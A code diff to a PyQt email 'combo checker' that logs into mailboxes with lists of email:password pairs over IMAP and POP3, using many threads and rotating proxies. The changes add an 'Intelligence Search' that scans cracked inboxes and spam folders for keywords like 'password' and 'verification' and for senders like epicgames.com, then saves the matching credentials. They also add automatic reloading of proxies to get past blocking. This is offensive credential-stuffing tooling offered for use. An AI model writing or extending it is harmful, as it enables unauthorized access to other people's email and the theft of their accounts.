@@ -194,7 +194,22 @@ class MailCheckerWorker(QObject):
         
         self.use_proxies = settings.get('use_proxies', False)
         self.proxy_type = settings.get('proxy_type', 'HTTP/HTTPS')
-        self.smart_search = settings.get('smart_search', False)
+        
+        # Intelligence Search settings
+        self.intelligence_search = settings.get('intelligence_search_enabled', False)
+        self.intelligence_keywords = settings.get('intelligence_keywords', '').split('\n')
+        self.intelligence_senders = settings.get('intelligence_senders', '').split('\n')
+        self.search_in_subject = settings.get('search_in_subject', True)
+        self.search_in_body = settings.get('search_in_body', True)
+        self.intelligence_mailboxes = settings.get('intelligence_mailboxes', 'INBOX').split(',')
+        self.fetch_count = settings.get('intelligence_emails_to_fetch', 5)
+
+        # Auto-reload proxies
+        self.auto_reload_proxies = settings.get('auto_reload_proxies', False)
+        self.proxy_reload_url = settings.get('proxy_reload_url', '')
+        self.proxy_reload_lock = threading.Lock()
+        self.blocked_proxies = set()
+        self.min_proxies_threshold = 10
 
     def create_session_folder(self):
         base_folder = "Results"
@@ -204,8 +219,8 @@ class MailCheckerWorker(QObject):
         session_folder = os.path.join(base_folder, timestamp)
         os.makedirs(session_folder, exist_ok=True)
         
-        # Create intelligence_results folder if Smart Search is enabled
-        if self.settings.get('smart_search', False):
+        # Create intelligence_results folder if Intelligence Search is enabled
+        if self.settings.get('intelligence_search_enabled', False):
             intelligence_folder = os.path.join(session_folder, "intelligence_results")
             os.makedirs(intelligence_folder, exist_ok=True)
         
@@ -383,6 +398,219 @@ class MailCheckerWorker(QObject):
                     pass
             return False, None, str(e)[:30]
 
+    def try_imap_login_keep_connection(self, email_addr, password, server, port, timeout=5):
+        """Try IMAP login and KEEP connection open for intelligence search"""
+        if not self.is_running:
+            return False, None, 'stopped'
+        
+        imap_conn = None
+        try:
+            imap_conn = imaplib.IMAP4_SSL(
+                host=server, 
+                port=port, 
+                ssl_context=self.ssl_context, 
+                timeout=timeout
+            )
+            
+            if not self.is_running:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return False, None, 'stopped'
+            
+            typ, data = imap_conn.login(email_addr, password)
+            
+            if typ == 'OK':
+                return True, imap_conn, None  # Return connection
+            else:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return False, None, 'invalid'
+                
+        except (imaplib.IMAP4.error, imaplib.IMAP4.abort):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'invalid'
+            
+        except (socket.timeout, TimeoutError):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'timeout'
+            
+        except Exception as e:
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, str(e)[:30]
+
+    def search_emails_for_intelligence(self, imap_conn, email_addr, password):
+        """Search emails for keywords and senders"""
+        if not self.is_running or not self.intelligence_search:
+            return
+        
+        try:
+            keywords = [k.strip() for k in self.intelligence_keywords if k.strip()]
+            senders = [s.strip() for s in self.intelligence_senders if s.strip()]
+            
+            if not any([keywords, senders]):
+                return
+            
+            for mailbox in self.intelligence_mailboxes:
+                if not self.is_running:
+                    break
+                
+                try:
+                    mailbox = mailbox.strip()
+                    status, data = imap_conn.select(f'"{mailbox}"', readonly=True)
+                    
+                    if status != 'OK':
+                        continue
+                    
+                    # Search for keywords
+                    for keyword in keywords:
+                        if not self.is_running:
+                            break
+                        
+                        search_criteria = []
+                        if self.search_in_subject:
+                            search_criteria.append(f'SUBJECT "{keyword}"')
+                        if self.search_in_body:
+                            search_criteria.append(f'BODY "{keyword}"')
+                        
+                        if not search_criteria:
+                            continue
+                        
+                        search_query = ' OR '.join(search_criteria)
+                        typ, data = imap_conn.search(None, f'({search_query})')
+                        
+                        if typ == 'OK' and data[0]:
+                            message_count = len(data[0].split())
+                            if message_count > 0:
+                                self.save_intelligence_result(keyword, f"{email_addr}:{password}", message_count)
+                                with self.stats_lock:
+                                    self.stats['intelligence_hits'] += 1
+                    
+                    # Search for senders
+                    for sender in senders:
+                        if not self.is_running:
+                            break
+                        
+                        typ, data = imap_conn.search(None, f'FROM "{sender}"')
+                        
+                        if typ == 'OK' and data[0]:
+                            message_count = len(data[0].split())
+                            if message_count > 0:
+                                self.save_intelligence_result(sender, f"{email_addr}:{password}", message_count)
+                                with self.stats_lock:
+                                    self.stats['intelligence_hits'] += 1
+                    
+                except Exception as e:
+                    logging.error(f"Mailbox {mailbox} error: {e}")
+                    continue
+                    
+        except Exception as e:
+            logging.error(f"Intelligence search error: {e}")
+
+    def save_intelligence_result(self, match_detail, combo, message_count):
+        """Save intelligence result to file"""
+        try:
+            import re
+            safe_filename = re.sub(r'[<>:"/\\|?*]', '_', match_detail)
+            output_file = os.path.join(
+                self.settings['intelligence_results_folder'],
+                f"{safe_filename}.txt"
+            )
+            
+            with open(output_file, 'a', encoding='utf-8') as f:
+                f.write(f"{combo} | {message_count} messages\n")
+            
+            self.signals.log.emit(
+                f"Intelligence: {combo} -> {match_detail} ({message_count} msgs)", 
+                QColor("cyan")
+            )
+        except Exception as e:
+            logging.error(f"Failed to save intelligence result: {e}")
+
+    def load_proxies_from_url(self):
+        """Load proxies from URL"""
+        if not self.proxy_reload_url:
+            return []
+        
+        try:
+            import urllib.request
+            
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            
+            self.signals.log.emit(f"Loading proxies from URL...", QColor("#00bcd4"))
+            
+            with urllib.request.urlopen(self.proxy_reload_url, context=ctx, timeout=15) as response:
+                content = response.read().decode('utf-8')
+                new_proxies = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
+                
+                self.signals.log.emit(f"Loaded {len(new_proxies)} new proxies", QColor("#4ade80"))
+                return new_proxies
+                
+        except Exception as e:
+            self.signals.log.emit(f"Failed to load proxies: {str(e)[:50]}", QColor("#f44336"))
+            logging.error(f"Proxy reload error: {e}")
+            return []
+
+    def reload_proxies_if_needed(self):
+        """Reload proxies if active count is low"""
+        if not self.auto_reload_proxies or not self.proxy_reload_url:
+            return
+        
+        with self.proxy_reload_lock:
+            active_proxies = len([p for p in self.proxies if p not in self.blocked_proxies])
+            
+            if active_proxies < self.min_proxies_threshold:
+                self.signals.log.emit(
+                    f"Low proxies ({active_proxies} left) - Reloading...", 
+                    QColor("#ff9800")
+                )
+                
+                new_proxies = self.load_proxies_from_url()
+                
+                if new_proxies:
+                    self.proxies.extend(new_proxies)
+                    self.proxies = [p for p in self.proxies if p not in self.blocked_proxies]
+                    self.blocked_proxies.clear()
+                    
+                    self.signals.log.emit(
+                        f"Proxies reloaded! Now: {len(self.proxies)} proxies", 
+                        QColor("#4ade80")
+                    )
+
+    def mark_proxy_as_blocked(self, proxy):
+        """Mark proxy as blocked"""
+        if not proxy:
+            return
+        
+        with self.proxy_reload_lock:
+            self.blocked_proxies.add(proxy)
+            active_proxies = len([p for p in self.proxies if p not in self.blocked_proxies])
+            
+            self.signals.log.emit(
+                f"Proxy blocked: {proxy} ({active_proxies} left)", 
+                QColor("#ff6b6b")
+            )
+            
+            if active_proxies < self.min_proxies_threshold:
+                self.reload_proxies_if_needed()
+
     def check_single_combo(self, combo):
         if not self.is_running:
             return None
@@ -395,17 +623,39 @@ class MailCheckerWorker(QObject):
             # Setup proxy if enabled
             if self.use_proxies and self.proxies:
                 import random
-                proxy = random.choice(self.proxies)
-                self.setup_proxy(proxy)
+                active_proxies = [p for p in self.proxies if p not in self.blocked_proxies]
+                if not active_proxies:
+                    self.reload_proxies_if_needed()
+                    active_proxies = [p for p in self.proxies if p not in self.blocked_proxies]
+                if active_proxies:
+                    proxy = random.choice(active_proxies)
+                    self.setup_proxy(proxy)
             
             timeout = self.settings['timeout']
             
-            if self.smart_search:
-                # Smart Search ON: IMAP only
+            if self.intelligence_search:
+                # Intelligence ON: IMAP only + Email Search
                 imap_server, imap_port = self.server_manager.get_imap_server(domain)
-                success, capture, error = self.try_imap_login(email_addr, password, imap_server, imap_port, timeout)
+                success, imap_conn, error = self.try_imap_login_keep_connection(email_addr, password, imap_server, imap_port, timeout)
                 
                 if success:
+                    # Search emails for intelligence
+                    self.search_emails_for_intelligence(imap_conn, email_addr, password)
+                    
+                    # Get message count
+                    try:
+                        imap_conn.select('INBOX', readonly=True)
+                        typ, data = imap_conn.search(None, 'ALL')
+                        message_count = len(data[0].split()) if typ == 'OK' and data[0] else 0
+                        capture = f"{message_count} messages"
+                    except:
+                        capture = "Valid"
+                    
+                    try:
+                        imap_conn.logout()
+                    except:
+                        pass
+                    
                     return {
                         'status': 'hit',
                         'combo': combo_str,
@@ -420,7 +670,7 @@ class MailCheckerWorker(QObject):
                     return {'status': 'error', 'combo': combo_str, 'reason': f'Error: {error}'}
             
             else:
-                # Smart Search OFF: POP3 first, then IMAP with 2-second delay
+                # Intelligence OFF: POP3 first, then IMAP with 2-second delay
                 pop_server, pop_port = self.server_manager.get_pop_server(domain)
                 success, capture, error = self.try_pop3_login(email_addr, password, pop_server, pop_port, timeout)
                 
@@ -727,12 +977,15 @@ class SettingsDialog(QDialog):
         
         general_tab = QWidget()
         proxy_tab = QWidget()
+        intelligence_tab = QWidget()
 
         tabs.addTab(general_tab, "General")
         tabs.addTab(proxy_tab, "Proxy")
+        tabs.addTab(intelligence_tab, "Intelligence")
 
         self.init_general_tab(general_tab)
         self.init_proxy_tab(proxy_tab)
+        self.init_intelligence_tab(intelligence_tab)
         
         self.buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
         self.buttons.button(QDialogButtonBox.StandardButton.Ok).setStyleSheet("""
@@ -785,19 +1038,10 @@ class SettingsDialog(QDialog):
         self.timeout_spinbox.setSuffix(" seconds")
         
         self.delimiter_edit = QLineEdit()
-        
-        self.smart_search_checkbox = QCheckBox("Smart Search (IMAP Only)")
-        self.smart_search_checkbox.setStyleSheet("color: #4ade80; font-weight: bold;")
-        
-        note_label = QLabel("Smart Search ON = IMAP only | OFF = POP3→IMAP with 2s delay")
-        note_label.setStyleSheet("color: #00bcd4; font-size: 9pt; padding: 5px;")
-        note_label.setWordWrap(True)
 
         layout.addRow("Threads:", self.threads_spinbox)
         layout.addRow("Timeout:", self.timeout_spinbox)
         layout.addRow("Combo Delimiter:", self.delimiter_edit)
-        layout.addRow("", self.smart_search_checkbox)
-        layout.addRow("", note_label)
 
     def init_proxy_tab(self, tab):
         layout = QVBoxLayout(tab)
@@ -825,6 +1069,25 @@ class SettingsDialog(QDialog):
         
         layout.addWidget(proxy_type_group)
         
+        # Auto-Reload Proxies group
+        auto_reload_group = QGroupBox("Auto-Reload Proxies")
+        auto_reload_form = QFormLayout(auto_reload_group)
+        auto_reload_form.setSpacing(12)
+
+        self.auto_reload_checkbox = QCheckBox("Enable Auto-Reload")
+        auto_reload_form.addRow("", self.auto_reload_checkbox)
+
+        self.proxy_url_edit = QLineEdit()
+        self.proxy_url_edit.setPlaceholderText("https://api.proxyscrape.com/v2/?request=get&protocol=http")
+        auto_reload_form.addRow("Proxy URL:", self.proxy_url_edit)
+
+        info_label = QLabel("Reloads automatically when active proxies < 10")
+        info_label.setStyleSheet("color: #00bcd4; font-size: 9pt;")
+        info_label.setWordWrap(True)
+        auto_reload_form.addRow("", info_label)
+
+        layout.addWidget(auto_reload_group)
+        
         if not SOCKS_AVAILABLE:
             warning_label = QLabel("PySocks not installed - SOCKS disabled")
             warning_label.setStyleSheet("color: #ffc107; font-weight: bold; padding: 10px;")
@@ -837,34 +1100,122 @@ class SettingsDialog(QDialog):
         self.use_proxies_checkbox.toggled.connect(proxy_type_group.setEnabled)
         proxy_type_group.setEnabled(False)
 
+    def init_intelligence_tab(self, tab):
+        """Initialize Intelligence Search tab"""
+        layout = QVBoxLayout(tab)
+        layout.setSpacing(15)
+        
+        self.intelligence_search_checkbox = QCheckBox("Enable Intelligence Search")
+        self.intelligence_search_checkbox.setStyleSheet("color: #4ade80; font-weight: bold;")
+        layout.addWidget(self.intelligence_search_checkbox)
+        
+        self.search_options_group = QGroupBox("Search Criteria")
+        form_layout = QFormLayout(self.search_options_group)
+        form_layout.setSpacing(12)
+        
+        # Keywords
+        self.keywords_edit = QTextEdit()
+        self.keywords_edit.setPlaceholderText("One keyword per line (e.g., password, invoice)")
+        self.keywords_edit.setMinimumHeight(80)
+        form_layout.addRow("Keywords:", self.keywords_edit)
+        
+        # Senders
+        self.senders_edit = QTextEdit()
+        self.senders_edit.setPlaceholderText("One sender per line (e.g., epicgames.com)")
+        self.senders_edit.setMinimumHeight(80)
+        form_layout.addRow("Senders:", self.senders_edit)
+        
+        # Search locations
+        search_locations_layout = QHBoxLayout()
+        self.search_in_subject_cb = QCheckBox("Subject")
+        self.search_in_subject_cb.setChecked(True)
+        self.search_in_body_cb = QCheckBox("Body")
+        self.search_in_body_cb.setChecked(True)
+        search_locations_layout.addWidget(self.search_in_subject_cb)
+        search_locations_layout.addWidget(self.search_in_body_cb)
+        form_layout.addRow("Search In:", search_locations_layout)
+        
+        # Mailboxes
+        self.mailboxes_edit = QLineEdit()
+        self.mailboxes_edit.setText("INBOX,Spam")
+        form_layout.addRow("Mailboxes:", self.mailboxes_edit)
+        
+        # Fetch count
+        self.fetch_count_spinbox = QSpinBox()
+        self.fetch_count_spinbox.setRange(1, 50)
+        self.fetch_count_spinbox.setValue(5)
+        self.fetch_count_spinbox.setSuffix(" emails")
+        form_layout.addRow("Fetch Count:", self.fetch_count_spinbox)
+        
+        layout.addWidget(self.search_options_group)
+        
+        # Info label
+        info_label = QLabel("Intelligence Search uses IMAP only for better email access")
+        info_label.setStyleSheet("color: #00bcd4; font-size: 9pt; padding: 5px;")
+        info_label.setWordWrap(True)
+        layout.addWidget(info_label)
+        
+        layout.addStretch()
+        
+        self.intelligence_search_checkbox.toggled.connect(self.search_options_group.setEnabled)
+        self.search_options_group.setEnabled(False)
+
     def load_settings(self):
         s = self.settings_manager
         self.threads_spinbox.setValue(s.value("threads", 200, type=int))
         self.timeout_spinbox.setValue(s.value("timeout", 10, type=int))
         self.delimiter_edit.setText(s.value("delimiter", ":"))
-        self.smart_search_checkbox.setChecked(s.value("smart_search", False, type=bool))
         
+        # Intelligence Search settings
+        is_intel_enabled = s.value("intelligence_search_enabled", False, type=bool)
+        self.intelligence_search_checkbox.setChecked(is_intel_enabled)
+        self.search_options_group.setEnabled(is_intel_enabled)
+        
+        self.keywords_edit.setText(s.value("intelligence_keywords", "password\ninvoice\nverification"))
+        self.senders_edit.setText(s.value("intelligence_senders", "epicgames.com\nmicrosoft.com"))
+        self.search_in_subject_cb.setChecked(s.value("search_in_subject", True, type=bool))
+        self.search_in_body_cb.setChecked(s.value("search_in_body", True, type=bool))
+        self.mailboxes_edit.setText(s.value("intelligence_mailboxes", "INBOX,Spam"))
+        self.fetch_count_spinbox.setValue(s.value("intelligence_emails_to_fetch", 5, type=int))
+        
+        # Proxy settings
         self.use_proxies_checkbox.setChecked(s.value("use_proxies", False, type=bool))
-        
         proxy_type = s.value("proxy_type", "HTTP/HTTPS")
         index = self.proxy_type_combo.findText(proxy_type)
         if index >= 0:
             self.proxy_type_combo.setCurrentIndex(index)
-        
         self.proxy_username_edit.setText(s.value("proxy_username", ""))
         self.proxy_password_edit.setText(s.value("proxy_password", ""))
+        
+        # Auto-reload proxies
+        self.auto_reload_checkbox.setChecked(s.value("auto_reload_proxies", False, type=bool))
+        self.proxy_url_edit.setText(s.value("proxy_reload_url", ""))
 
     def accept(self):
         s = self.settings_manager
         s.setValue("threads", self.threads_spinbox.value())
         s.setValue("timeout", self.timeout_spinbox.value())
         s.setValue("delimiter", self.delimiter_edit.text())
-        s.setValue("smart_search", self.smart_search_checkbox.isChecked())
         
+        # Intelligence Search
+        s.setValue("intelligence_search_enabled", self.intelligence_search_checkbox.isChecked())
+        s.setValue("intelligence_keywords", self.keywords_edit.toPlainText())
+        s.setValue("intelligence_senders", self.senders_edit.toPlainText())
+        s.setValue("search_in_subject", self.search_in_subject_cb.isChecked())
+        s.setValue("search_in_body", self.search_in_body_cb.isChecked())
+        s.setValue("intelligence_mailboxes", self.mailboxes_edit.text())
+        s.setValue("intelligence_emails_to_fetch", self.fetch_count_spinbox.value())
+        
+        # Proxy
         s.setValue("use_proxies", self.use_proxies_checkbox.isChecked())
         s.setValue("proxy_type", self.proxy_type_combo.currentText())
         s.setValue("proxy_username", self.proxy_username_edit.text())
         s.setValue("proxy_password", self.proxy_password_edit.text())
+        
+        # Auto-reload
+        s.setValue("auto_reload_proxies", self.auto_reload_checkbox.isChecked())
+        s.setValue("proxy_reload_url", self.proxy_url_edit.text())
+        
         super().accept()
 
 
@@ -1349,11 +1700,25 @@ class MainWindow(QMainWindow):
             "threads": self.settings.value("threads", 200, type=int),
             "timeout": self.settings.value("timeout", 10, type=int),
             "delimiter": self.settings.value("delimiter", ":"),
-            "smart_search": self.settings.value("smart_search", False, type=bool),
+            
+            # Intelligence Search
+            "intelligence_search_enabled": self.settings.value("intelligence_search_enabled", False, type=bool),
+            "intelligence_keywords": self.settings.value("intelligence_keywords", "password\ninvoice"),
+            "intelligence_senders": self.settings.value("intelligence_senders", "epicgames.com\nmicrosoft.com"),
+            "search_in_subject": self.settings.value("search_in_subject", True, type=bool),
+            "search_in_body": self.settings.value("search_in_body", True, type=bool),
+            "intelligence_mailboxes": self.settings.value("intelligence_mailboxes", "INBOX,Spam"),
+            "intelligence_emails_to_fetch": self.settings.value("intelligence_emails_to_fetch", 5, type=int),
+            
+            # Proxy
             "use_proxies": self.settings.value("use_proxies", False, type=bool),
             "proxy_type": self.settings.value("proxy_type", "HTTP/HTTPS"),
             "proxy_username": self.settings.value("proxy_username", ""),
-            "proxy_password": self.settings.value("proxy_password", "")
+            "proxy_password": self.settings.value("proxy_password", ""),
+            
+            # Auto-reload
+            "auto_reload_proxies": self.settings.value("auto_reload_proxies", False, type=bool),
+            "proxy_reload_url": self.settings.value("proxy_reload_url", "")
         }
 
     def load_combos(self):
